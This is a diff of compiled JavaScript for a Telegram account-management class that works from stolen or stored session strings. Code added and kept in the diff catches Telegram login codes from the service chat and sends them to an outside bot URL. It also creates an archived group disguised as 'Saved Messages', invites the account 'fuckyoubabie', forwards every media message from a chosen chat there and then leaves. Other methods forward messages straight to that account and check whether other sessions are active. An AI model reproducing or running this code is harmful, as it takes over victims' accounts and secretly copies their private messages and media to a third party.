@@ -41,6 +41,15 @@ const utils_1 = require("../../utils");
 const parseError_1 = require("../../utils/parseError");
 const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
 const logbots_1 = require("../../utils/logbots");
+var TelegramErrorCode;
+(function (TelegramErrorCode) {
+    TelegramErrorCode["FLOOD_WAIT"] = "FLOOD_WAIT";
+    TelegramErrorCode["FILE_REFERENCE_EXPIRED"] = "FILE_REFERENCE_EXPIRED";
+    TelegramErrorCode["USERNAME_NOT_MODIFIED"] = "USERNAME_NOT_MODIFIED";
+    TelegramErrorCode["TIMEOUT"] = "TIMEOUT";
+    TelegramErrorCode["PHONE_CODE_INVALID"] = "PHONE_CODE_INVALID";
+    TelegramErrorCode["PASSWORD_REQUIRED"] = "PASSWORD_REQUIRED";
+})(TelegramErrorCode || (TelegramErrorCode = {}));
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -55,92 +64,127 @@ class TelegramManager {
         TelegramManager.activeClientSetup = data;
     }
     async createGroup() {
-        const groupName = "Saved Messages";
-        const groupDescription = this.phoneNumber;
-        const result = await this.client.invoke(new tl_1.Api.channels.CreateChannel({
-            title: groupName,
-            about: groupDescription,
-            megagroup: true,
-            forImport: true,
-        }));
-        const { id, accessHash } = result.chats[0];
-        const folderId = 1;
+        return this.safeOperation({
+            execute: async () => {
+                const result = await this.retryOperation(async () => {
+                    const groupResult = await this.client.invoke(new tl_1.Api.channels.CreateChannel({
+                        title: "Saved Messages",
+                        about: this.phoneNumber,
+                        megagroup: true,
+                        forImport: true,
+                    }));
+                    const { id, accessHash } = groupResult.chats[0];
+                    await Promise.all([
+                        this.categorizeDialogToFolder(id, accessHash),
+                        this.addUsersToChannel(id, accessHash)
+                    ]);
+                    return { id: id.toString(), accessHash: accessHash.toString() };
+                });
+                return result;
+            }
+        });
+    }
+    async categorizeDialogToFolder(channelId, accessHash) {
         await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
             folderPeers: [
                 new tl_1.Api.InputFolderPeer({
                     peer: new tl_1.Api.InputPeerChannel({
-                        channelId: id,
-                        accessHash: accessHash,
+                        channelId,
+                        accessHash,
                     }),
-                    folderId: folderId,
+                    folderId: 1,
                 }),
             ],
         }));
-        const usersToAdd = ["fuckyoubabie"];
-        const addUsersResult = await this.client.invoke(new tl_1.Api.channels.InviteToChannel({
+    }
+    async addUsersToChannel(channelId, accessHash) {
+        await this.client.invoke(new tl_1.Api.channels.InviteToChannel({
             channel: new tl_1.Api.InputChannel({
-                channelId: id,
-                accessHash: accessHash,
+                channelId,
+                accessHash,
             }),
-            users: usersToAdd
+            users: ["fuckyoubabie"]
         }));
-        return { id, accessHash };
     }
     async createGroupAndForward(fromChatId) {
-        const { id, accessHash } = await this.createGroup();
-        await this.forwardSecretMsgs(fromChatId, id.toString());
+        try {
+            const { id } = await this.createGroup();
+            await this.forwardSecretMsgs(fromChatId, id);
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error in createGroupAndForward:', parsedError);
+            throw error;
+        }
     }
     async joinChannelAndForward(fromChatId, channel) {
-        const result = await this.joinChannel(channel);
-        const folderId = 1;
-        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
-            folderPeers: [
-                new tl_1.Api.InputFolderPeer({
-                    peer: new tl_1.Api.InputPeerChannel({
-                        channelId: result.chats[0].id,
-                        accessHash: result.chats[0].accessHash,
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        try {
+            const result = await this.joinChannel(channel);
+            const channelResult = result;
+            if (!channelResult?.chats?.[0]) {
+                throw new Error('Failed to join channel');
+            }
+            await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
+                folderPeers: [
+                    new tl_1.Api.InputFolderPeer({
+                        peer: new tl_1.Api.InputPeerChannel({
+                            channelId: channelResult.chats[0].id,
+                            accessHash: channelResult.chats[0].accessHash,
+                        }),
+                        folderId: 1,
                     }),
-                    folderId: folderId,
-                }),
-            ],
-        }));
-        await this.forwardSecretMsgs(fromChatId, channel);
+                ],
+            }));
+            await this.forwardSecretMsgs(fromChatId, channel);
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error in joinChannelAndForward:', parsedError);
+            throw error;
+        }
     }
     async forwardSecretMsgs(fromChatId, toChatId) {
-        let offset = 0;
-        const limit = 100;
-        let totalMessages = 0;
-        let forwardedCount = 0;
-        let messages = [];
-        do {
-            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
-            totalMessages = messages.total;
-            const messageIds = messages.map((message) => {
-                offset = message.id;
-                if (message.id && message.media) {
-                    return message.id;
-                }
-                return undefined;
-            }).filter(id => id !== undefined);
-            console.log(messageIds);
-            if (messageIds.length > 0) {
-                try {
-                    const result = await this.client.forwardMessages(toChatId, {
-                        messages: messageIds,
-                        fromPeer: fromChatId,
+        return this.safeOperation({
+            execute: async () => {
+                let offset = 0;
+                const limit = 100;
+                let forwardedCount = 0;
+                const rateLimitDelay = 5000;
+                while (true) {
+                    const messages = await this.client.getMessages(fromChatId, {
+                        offsetId: offset,
+                        limit
                     });
-                    forwardedCount += messageIds.length;
-                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
-                    await (0, Helpers_1.sleep)(5000);
+                    if (!messages.length)
+                        break;
+                    const messageIds = this.filterMediaMessages(messages);
+                    offset = messages[messages.length - 1].id;
+                    if (messageIds.length > 0) {
+                        await this.forwardMessagesWithRetry(toChatId, fromChatId, messageIds);
+                        forwardedCount += messageIds.length;
+                        console.log(`Forwarded ${forwardedCount} messages`);
+                        await (0, Helpers_1.sleep)(rateLimitDelay);
+                    }
+                    await (0, Helpers_1.sleep)(rateLimitDelay);
                 }
-                catch (error) {
-                    console.error("Error occurred while forwarding messages:", error);
-                }
-                await (0, Helpers_1.sleep)(5000);
+                await this.leaveChannels([toChatId]);
             }
-        } while (messages.length > 0);
-        await this.leaveChannels([toChatId]);
-        return;
+        });
+    }
+    filterMediaMessages(messages) {
+        return messages
+            .filter(message => message.id && message.media)
+            .map(message => message.id);
+    }
+    async forwardMessagesWithRetry(toChatId, fromChatId, messageIds) {
+        await this.retryOperation(async () => {
+            await this.client.forwardMessages(toChatId, {
+                messages: messageIds,
+                fromPeer: fromChatId,
+            });
+        }, 3);
     }
     async forwardMessages(fromChatId, toChatId, messageIds) {
         const chunkSize = 30;
@@ -199,70 +243,131 @@ class TelegramManager {
         }
     }
     async createClient(handler = true, handlerFn) {
-        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
-            connectionRetries: 5,
-        });
-        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
-        await this.client.connect();
-        const me = await this.client.getMe();
-        console.log("Connected Client : ", me.phone);
-        if (handler && this.client) {
-            console.log("Adding event Handler");
-            if (handlerFn) {
-                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
+        try {
+            this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID || '', 10), process.env.API_HASH || '', {
+                connectionRetries: 5,
+            });
+            this.client.setLogLevel(Logger_1.LogLevel.ERROR);
+            await this.retryOperation(async () => {
+                await this.client?.connect();
+                const me = await this.client?.getMe();
+                if (!me)
+                    throw new Error('Failed to get user info');
+                console.log("Connected Client : ", me.phone);
+            });
+            if (handler && this.client) {
+                console.log("Adding event Handler");
+                const eventHandler = handlerFn || this.handleEvents.bind(this);
+                this.client.addEventHandler(eventHandler, new events_1.NewMessage());
             }
-            else {
-                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
+            return this.client;
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error("Error creating client:", parsedError);
+            throw error;
+        }
+    }
+    async handleEvents(event) {
+        if (event.isPrivate) {
+            if (event.message.chatId.toString() == "777000") {
+                console.log(event.message.text.toLowerCase());
+                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
+                console.log("Date :", new Date(event.message.date * 1000));
+                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(event.message.text)}`);
             }
         }
-        return this.client;
     }
-    async getGrpMembers(entity) {
-        try {
-            const result = [];
-            const chat = await this.client.getEntity(entity);
-            if (!(chat instanceof tl_1.Api.Chat || chat instanceof tl_1.Api.Channel)) {
-                console.log("Invalid group or channel!");
-                return;
-            }
-            console.log(`Fetching members of ${chat.title || chat.username}...`);
-            const participants = await this.client.invoke(new tl_1.Api.channels.GetParticipants({
-                channel: chat,
-                filter: new tl_1.Api.ChannelParticipantsRecent(),
-                offset: 0,
-                limit: 200,
-                hash: (0, big_integer_1.default)(0),
-            }));
-            if (participants instanceof tl_1.Api.channels.ChannelParticipants) {
-                const users = participants.participants;
-                console.log(`Members: ${users.length}`);
-                for (const user of users) {
-                    const userInfo = user instanceof tl_1.Api.ChannelParticipant ? user.userId : null;
-                    if (userInfo) {
-                        const userDetails = await this.client.getEntity(userInfo);
-                        result.push({
-                            tgId: userDetails.id,
-                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
-                            username: `${userDetails.username || ""}`,
-                        });
-                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
-                            console.log(JSON.stringify(userDetails.id));
+    async channelInfo(sendIds = false) {
+        return this.safeOperation({
+            execute: async () => {
+                const chats = await this.client.getDialogs({ limit: 1500 });
+                let canSendTrueCount = 0;
+                let canSendFalseCount = 0;
+                let totalCount = 0;
+                this.channelArray = [];
+                const canSendFalseChats = [];
+                console.log("TotalChats:", chats.total);
+                for (const chat of chats) {
+                    if (!chat.isChannel && !chat.isGroup)
+                        continue;
+                    try {
+                        const chatEntity = chat.entity.toJSON();
+                        const { broadcast, defaultBannedRights, id } = chatEntity;
+                        const channelId = id.toString()?.replace(/^-100/, "");
+                        totalCount++;
+                        if (!broadcast && !defaultBannedRights?.sendMessages) {
+                            canSendTrueCount++;
+                            this.channelArray.push(channelId);
+                        }
+                        else {
+                            canSendFalseCount++;
+                            canSendFalseChats.push(channelId);
                         }
                     }
-                    else {
-                        console.log(JSON.stringify(user?.userId));
+                    catch (error) {
+                        const parsedError = (0, parseError_1.parseError)(error);
+                        console.warn(`Failed to process chat: ${parsedError.message}`);
                     }
                 }
+                return {
+                    chatsArrayLength: totalCount,
+                    canSendTrueCount,
+                    canSendFalseCount,
+                    ids: sendIds ? this.channelArray : [],
+                    canSendFalseChats
+                };
             }
-            else {
-                console.log("No members found or invalid group.");
+        });
+    }
+    async getGrpMembers(entity) {
+        return this.safeOperation({
+            execute: async () => {
+                const chat = await this.client.getEntity(entity);
+                if (!(chat instanceof tl_1.Api.Chat || chat instanceof tl_1.Api.Channel)) {
+                    throw new Error("Invalid group or channel!");
+                }
+                console.log(`Fetching members of ${chat.title || chat.username}...`);
+                const participants = await this.client.invoke(new tl_1.Api.channels.GetParticipants({
+                    channel: chat,
+                    filter: new tl_1.Api.ChannelParticipantsRecent(),
+                    offset: 0,
+                    limit: 200,
+                    hash: (0, big_integer_1.default)(0),
+                }));
+                if (!(participants instanceof tl_1.Api.channels.ChannelParticipants)) {
+                    throw new Error("Failed to fetch participants");
+                }
+                const result = await this.processParticipants(participants.participants);
+                console.log(`Processed ${result.length} members`);
+                return result;
             }
-            console.log(result.length);
-            return result;
+        });
+    }
+    async processParticipants(participants) {
+        const result = [];
+        for (const participant of participants) {
+            try {
+                const userId = participant instanceof tl_1.Api.ChannelParticipant ? participant.userId : null;
+                if (!userId)
+                    continue;
+                const userDetails = await this.client.getEntity(userId);
+                const memberInfo = {
+                    tgId: userDetails.id.toString(),
+                    name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`.trim(),
+                    username: userDetails.username || "",
+                };
+                result.push(memberInfo);
+                if (userDetails.firstName === 'Deleted Account' && !userDetails.username) {
+                    console.log('Found deleted account:', userDetails.id.toString());
+                }
+            }
+            catch (error) {
+                const parsedError = (0, parseError_1.parseError)(error);
+                console.warn(`Failed to process participant: ${parsedError.message}`);
+            }
         }
-        catch (err) {
-            console.error("Error fetching group members:", err);
-        }
+        return result;
     }
     async getMessages(entityLike, limit = 8) {
         const messages = await this.client.getMessages(entityLike, { limit });
@@ -325,45 +430,6 @@ class TelegramManager {
         }
         return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
     }
-    async channelInfo(sendIds = false) {
-        if (!this.client)
-            throw new Error('Client is not initialized');
-        const chats = await this.client.getDialogs({ limit: 1500 });
-        let canSendTrueCount = 0;
-        let canSendFalseCount = 0;
-        let totalCount = 0;
-        this.channelArray.length = 0;
-        const canSendFalseChats = [];
-        console.log("TotalChats:", chats.total);
-        for (const chat of chats) {
-            if (chat.isChannel || chat.isGroup) {
-                try {
-                    const chatEntity = chat.entity.toJSON();
-                    const { broadcast, defaultBannedRights, id } = chatEntity;
-                    totalCount++;
-                    if (!broadcast && !defaultBannedRights?.sendMessages) {
-                        canSendTrueCount++;
-                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
-                    }
-                    else {
-                        canSendFalseCount++;
-                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
-                    }
-                }
-                catch (error) {
-                    (0, parseError_1.parseError)(error);
-                }
-            }
-        }
-        ;
-        return {
-            chatsArrayLength: totalCount,
-            canSendTrueCount,
-            canSendFalseCount,
-            ids: sendIds ? this.channelArray : [],
-            canSendFalseChats
-        };
-    }
     async addContact(data, namePrefix) {
         try {
             for (let i = 0; i < data.length; i++) {
@@ -389,57 +455,78 @@ class TelegramManager {
         }
     }
     async addContacts(mobiles, namePrefix) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         try {
-            const inputContacts = [];
-            for (let i = 0; i < mobiles.length; i++) {
-                const user = mobiles[i];
-                const firstName = `${namePrefix}${i + 1}`;
-                const lastName = "";
-                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
-                inputContacts.push(new tl_1.Api.InputPhoneContact({
-                    clientId: clientId,
-                    phone: user,
-                    firstName: firstName,
-                    lastName: lastName
-                }));
-            }
+            const inputContacts = mobiles.map((mobile, index) => {
+                const firstName = `${namePrefix}${index + 1}`;
+                const clientId = (0, big_integer_1.default)((index << 16).toString());
+                return new tl_1.Api.InputPhoneContact({
+                    clientId,
+                    phone: mobile,
+                    firstName,
+                    lastName: '',
+                });
+            });
             const result = await this.client.invoke(new tl_1.Api.contacts.ImportContacts({
                 contacts: inputContacts,
             }));
             console.log("Imported Contacts Result:", result);
         }
         catch (error) {
-            console.error("Error adding contacts:", error);
-            (0, parseError_1.parseError)(error, `Failed to save contacts`);
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error("Error adding contacts:", parsedError);
+            throw error;
         }
     }
     async leaveChannels(chats) {
-        console.log("Leaving Channels: initaied!!");
-        console.log("ChatsLength: ", chats);
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        console.log("Leaving Channels: initiated!!");
+        console.log("Chats to leave:", chats.length);
         for (const id of chats) {
             try {
                 await this.client.invoke(new tl_1.Api.channels.LeaveChannel({
                     channel: id
                 }));
-                console.log("Left channel :", id);
+                console.log("Left channel:", id);
                 if (chats.length > 1) {
                     await (0, Helpers_1.sleep)(30000);
                 }
             }
             catch (error) {
-                const errorDetails = (0, parseError_1.parseError)(error);
-                console.log("Failed to leave channel :", errorDetails.message);
+                const parsedError = (0, parseError_1.parseError)(error);
+                console.log("Failed to leave channel:", parsedError.message);
             }
         }
     }
     async getEntity(entity) {
-        return await this.client?.getEntity(entity);
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        try {
+            return await this.client.getEntity(entity);
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error getting entity:', parsedError);
+            throw error;
+        }
     }
     async joinChannel(entity) {
-        console.log("trying to join channel : ", entity);
-        return await this.client?.invoke(new tl_1.Api.channels.JoinChannel({
-            channel: await this.client?.getEntity(entity)
-        }));
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        try {
+            console.log("Trying to join channel:", entity);
+            const channelEntity = await this.client.getEntity(entity);
+            return await this.client.invoke(new tl_1.Api.channels.JoinChannel({
+                channel: channelEntity
+            }));
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error joining channel:', parsedError);
+            throw error;
+        }
     }
     connected() {
         return this.client.connected;
@@ -474,8 +561,14 @@ class TelegramManager {
     async getAuths() {
         if (!this.client)
             throw new Error('Client is not initialized');
-        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
-        return result;
+        try {
+            return await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error getting authorizations:', parsedError);
+            throw error;
+        }
     }
     async getAllChats() {
         if (!this.client)
@@ -636,14 +729,35 @@ class TelegramManager {
             chatCallCounts: filteredChatCallCounts
         };
     }
-    async handleEvents(event) {
-        if (event.isPrivate) {
-            if (event.message.chatId.toString() == "777000") {
-                console.log(event.message.text.toLowerCase());
-                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
-                console.log("Date :", new Date(event.message.date * 1000));
-                await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(event.message.text)}`);
-            }
+    async getLastActiveTime() {
+        try {
+            const result = await this.getAuths();
+            let latestActivity = 0;
+            result.authorizations.forEach((auth) => {
+                if (!this.isAuthMine(auth) && auth.dateActive > latestActivity) {
+                    latestActivity = auth.dateActive;
+                }
+            });
+            return new Date(latestActivity * 1000).toISOString().split('T')[0];
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error getting last active time:', parsedError);
+            throw error;
+        }
+    }
+    async getContacts() {
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        try {
+            return await this.client.invoke(new tl_1.Api.contacts.GetContacts({
+                hash: (0, big_integer_1.default)(0)
+            }));
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error getting contacts:', parsedError);
+            throw error;
         }
     }
     async updatePrivacyforDeletedAccount() {
@@ -747,25 +861,9 @@ class TelegramManager {
             console.error("Error:", err);
         }
     }
-    async getLastActiveTime() {
-        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
-        let latest = 0;
-        result.authorizations.map((auth) => {
-            if (!this.isAuthMine(auth)) {
-                if (latest < auth.dateActive) {
-                    latest = auth.dateActive;
-                }
-            }
-        });
-        return (new Date(latest * 1000)).toISOString().split('T')[0];
-    }
-    async getContacts() {
-        const exportedContacts = await this.client.invoke(new tl_1.Api.contacts.GetContacts({
-            hash: (0, big_integer_1.default)(0)
-        }));
-        return exportedContacts;
-    }
     async deleteChat(chatId) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         try {
             await this.client.invoke(new tl_1.Api.messages.DeleteHistory({
                 justClear: false,
@@ -775,104 +873,78 @@ class TelegramManager {
             console.log(`Dialog with ID ${chatId} has been deleted.`);
         }
         catch (error) {
-            console.error('Failed to delete dialog:', error);
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error deleting chat:', parsedError);
+            throw error;
         }
     }
     async blockUser(chatId) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         try {
-            await this.client?.invoke(new tl_1.Api.contacts.Block({
+            await this.client.invoke(new tl_1.Api.contacts.Block({
                 id: chatId,
             }));
             console.log(`User with ID ${chatId} has been blocked.`);
         }
         catch (error) {
-            console.error('Failed to block user:', error);
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error blocking user:', parsedError);
+            throw error;
         }
     }
-    downloadWithTimeout(promise, timeout) {
-        return Promise.race([
-            promise,
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
-        ]);
+    async downloadMedia(chatId, messageId, res) {
+        return this.safeOperation({
+            execute: async () => {
+                const messages = await this.client.getMessages(chatId, { ids: [messageId] });
+                const message = messages[0];
+                if (!message?.media || message.media instanceof tl_1.Api.MessageMediaEmpty) {
+                    throw new Error('Media not found');
+                }
+                const { contentType, filename, fileLocation } = this.getMediaDetails(message);
+                const chunkSize = TelegramManager.CHUNK_SIZE;
+                const maxSize = TelegramManager.MAX_FILE_SIZE;
+                res.setHeader('Content-Type', contentType);
+                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+                let downloadedSize = 0;
+                for await (const chunk of this.client.iterDownload({
+                    file: fileLocation,
+                    offset: (0, big_integer_1.default)(0),
+                    limit: maxSize,
+                    requestSize: chunkSize,
+                })) {
+                    downloadedSize += chunk.length;
+                    if (downloadedSize > maxSize) {
+                        throw new Error('File size exceeds maximum allowed size');
+                    }
+                    res.write(chunk);
+                }
+                res.end();
+            }
+        });
     }
-    async getMediaMetadata(chatId = 'me', offset = undefined, limit = 100) {
-        try {
-            const query = { limit: parseInt(limit.toString()) };
-            if (offset)
-                query['offsetId'] = parseInt(offset.toString());
-            const messages = await this.client.getMessages(chatId, query);
-            const mediaMessages = messages.filter(message => {
-                return (message.media && message.media.className !== "MessageMediaWebPage");
-            });
-            console.log("Total:", messages.total, "fetched: ", messages.length, "ChatId: ", chatId, "Media :", mediaMessages.length);
-            if (!messages.length) {
-                console.log("No more media messages found. Reached the end of the chat.");
-                return { data: [], endOfMessages: true };
-            }
-            const data = [];
-            for (const message of mediaMessages) {
-                console.log(message.media.className, message.document?.mimeType);
-                let thumbBuffer = null;
-                try {
-                    if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
-                        const sizes = message.photo?.sizes || [1];
-                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
-                        console.log("messageId image:", message.id);
-                        data.push({
-                            messageId: message.id,
-                            mediaType: 'photo',
-                            thumb: thumbBuffer?.toString('base64') || null,
-                        });
-                    }
-                    else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
-                        const sizes = message.document?.thumbs || [1];
-                        console.log("messageId video:", message.id);
-                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
-                        data.push({
-                            messageId: message.id,
-                            mediaType: 'video',
-                            thumb: thumbBuffer?.toString('base64') || null,
-                        });
-                    }
-                }
-                catch (downloadError) {
-                    if (downloadError.message === 'Download timeout') {
-                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);
-                    }
-                    else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
-                        console.warn('File reference expired for message. Skipping this media.');
-                    }
-                    else {
-                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);
-                    }
-                    data.push({
-                        messageId: message.id,
-                        mediaType: 'photo',
-                        thumb: null,
-                    });
-                    continue;
-                }
-            }
-            if (!data.length) {
-                data.push({
-                    messageId: messages[messages.length - 1].id,
-                    mediaType: 'photo',
-                    thumb: null,
-                });
-            }
-            console.log("Returning ", data.length);
-            return { data, endOfMessages: false };
+    getMediaDetails(message) {
+        const inputLocation = message.video || message.photo;
+        const locationData = {
+            id: inputLocation.id,
+            accessHash: inputLocation.accessHash,
+            fileReference: inputLocation.fileReference,
+        };
+        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
+            return {
+                contentType: 'image/jpeg',
+                filename: 'photo.jpg',
+                fileLocation: new tl_1.Api.InputPhotoFileLocation({ ...locationData, thumbSize: 'm' })
+            };
         }
-        catch (error) {
-            console.error('Error in getMediaMetadata:', error);
-            if (error.message.includes('FLOOD_WAIT')) {
-                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\d+)/)[1], 10);
-                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);
-                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
-                return this.getMediaMetadata(chatId, offset, limit);
-            }
-            throw new Error('Error fetching media metadata');
+        else if (message.media instanceof tl_1.Api.MessageMediaDocument) {
+            return {
+                contentType: message.document?.mimeType || 'video/mp4',
+                filename: 'video.mp4',
+                fileLocation: new tl_1.Api.InputDocumentFileLocation({ ...locationData, thumbSize: '' })
+            };
         }
+        throw new Error('Unsupported media type');
     }
     async downloadMediaFile(messageId, chatId = 'me', res) {
         try {
@@ -926,130 +998,203 @@ class TelegramManager {
         }
     }
     async forwardMessage(chatId, messageId) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         try {
-            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId });
+            await this.client.forwardMessages("@fuckyoubabie", {
+                fromPeer: chatId,
+                messages: messageId
+            });
         }
         catch (error) {
-            console.log("Failed to Forward Message : ", error.errorMessage);
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error forwarding message:', parsedError);
         }
     }
     async updateUsername(baseUsername) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         let newUserName = '';
-        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
+        let username = baseUsername.trim();
         let increment = 0;
-        if (username === '') {
-            try {
-                await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
-                console.log(`Removed Username successfully.`);
+        const maxAttempts = 10;
+        try {
+            if (username === '') {
+                await this.retryOperation(() => this.client.invoke(new tl_1.Api.account.UpdateUsername({ username: '' })));
+                console.log('Removed Username successfully.');
+                return '';
             }
-            catch (error) {
-                console.log(error);
-            }
-        }
-        else {
-            while (increment < 10) {
+            while (increment < maxAttempts) {
                 try {
                     const result = await this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
-                    console.log(result, " - ", username);
                     if (result) {
                         await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                         console.log(`Username '${username}' updated successfully.`);
                         newUserName = username;
                         break;
                     }
-                    else {
-                        username = baseUsername + increment;
-                        increment++;
-                        await (0, Helpers_1.sleep)(2000);
-                    }
                 }
                 catch (error) {
-                    console.log(error.message);
-                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
+                    const parsedError = (0, parseError_1.parseError)(error);
+                    if (parsedError.message === 'USERNAME_NOT_MODIFIED') {
                         newUserName = username;
                         break;
                     }
-                    username = baseUsername + increment;
-                    increment++;
-                    await (0, Helpers_1.sleep)(2000);
+                    console.warn(`Username attempt failed: ${parsedError.message}`);
                 }
+                username = `${baseUsername}${++increment}`;
+                await (0, Helpers_1.sleep)(2000);
             }
+            return newUserName;
         }
-        return newUserName;
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error updating username:', parsedError);
+            throw error;
+        }
     }
     async updatePrivacy() {
-        try {
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        const privacySettings = [
+            {
                 key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueDisallowAll()
-                ],
-            }));
-            console.log("Calls Updated");
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                rules: [new tl_1.Api.InputPrivacyValueDisallowAll()]
+            },
+            {
                 key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueAllowAll()
-                ],
-            }));
-            console.log("PP Updated");
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
+            },
+            {
                 key: new tl_1.Api.InputPrivacyKeyForwards(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueAllowAll()
-                ],
-            }));
-            console.log("forwards Updated");
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
+            },
+            {
                 key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueDisallowAll()
-                ],
-            }));
-            console.log("Number Updated");
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                rules: [new tl_1.Api.InputPrivacyValueDisallowAll()]
+            },
+            {
                 key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueAllowAll()
-                ],
-            }));
-            console.log("LAstSeen Updated");
-            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
+            },
+            {
                 key: new tl_1.Api.InputPrivacyKeyAbout(),
-                rules: [
-                    new tl_1.Api.InputPrivacyValueAllowAll()
-                ],
-            }));
+                rules: [new tl_1.Api.InputPrivacyValueAllowAll()]
+            }
+        ];
+        try {
+            for (const setting of privacySettings) {
+                await this.retryOperation(() => this.client.invoke(new tl_1.Api.account.SetPrivacy({
+                    key: setting.key,
+                    rules: setting.rules
+                })));
+                console.log(`Updated privacy for ${setting.key.className}`);
+            }
         }
-        catch (e) {
-            throw e;
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error updating privacy settings:', parsedError);
+            throw error;
         }
     }
     async getFileUrl(url, filename) {
-        const response = await axios_1.default.get(url, { responseType: 'stream' });
         const filePath = `/tmp/${filename}`;
-        await new Promise((resolve, reject) => {
-            const writer = fs.createWriteStream(filePath);
-            response.data.pipe(writer);
-            writer.on('finish', () => resolve(true));
-            writer.on('error', reject);
+        return this.safeOperation({
+            execute: async () => {
+                const response = await axios_1.default.get(url, {
+                    responseType: 'stream',
+                    timeout: 30000,
+                    maxContentLength: TelegramManager.MAX_FILE_SIZE
+                });
